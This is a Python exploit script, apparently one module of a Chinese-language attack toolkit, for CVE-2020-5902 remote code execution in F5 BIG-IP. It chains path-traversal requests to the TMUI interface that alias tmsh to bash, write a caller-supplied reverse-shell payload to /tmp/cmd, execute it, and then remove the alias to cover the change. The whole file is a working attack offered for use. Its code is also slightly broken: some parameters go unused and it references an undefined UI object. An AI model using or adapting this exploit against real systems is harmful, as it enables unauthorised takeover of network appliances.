#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/7/26 5:21 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : CVE_2020_5902_BIG_IP_RCE.py
# @Software: PyCharm

import requests
import time
import re
import json

requests.packages.urllib3.disable_warnings()

class run(object):
    def __init__(self):
        self.name = "CVE_2020_5902_BIG_IP_RCE"

    def runRebound(self, targetAddr, payload, lhost,lport,reboundData):
        """
        反弹shell
        :param targetAddr:
        :param payload:
        :param lhost:
        :param lport:
        :param reboundData:
        :return:
        """
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
        Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400"
        }

        if 'https://' in targetAddr:
            pass
        else:
            targetAddr = 'https://' + targetAddr

        if payload == 'CVE_2020_5902_BIG_IP_RCE':
            payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
            payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content={}'.format(
                reboundData)
            payload03 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
            payload04 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        else:
            return self.ui.textEdit.append('您的输入有误,或者没有加HTTPS请求头!')

        url1 = targetAddr + payload01
        url2 = targetAddr + payload02
        url3 = targetAddr + payload03
        url4 = targetAddr + payload04

        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        try:
            requests.get(url1, verify=False, headers=headers, timeout=5)
            requests.get(url2, verify=False, headers=headers, timeout=5)
            requests.get(url3, verify=False, headers=headers, timeout=5)

            data = '[+]{} 反弹执行完成！ {}'.format(targetAddr, currentTime)
            return {'status': 20000, 'data': data, 'type': 'status'}
        except requests.exceptions.RequestException as e:
            pass

        try:
            requests.get(url4, verify=False, headers=headers, timeout=5)

            data = '[+]{} 还原alias设置，防止影响目标正常使用! {}'.format(targetAddr, currentTime)
            return {'status': 20000, 'data': data, 'type': 'status'}

        except requests.exceptions.RequestException as e:
            pass



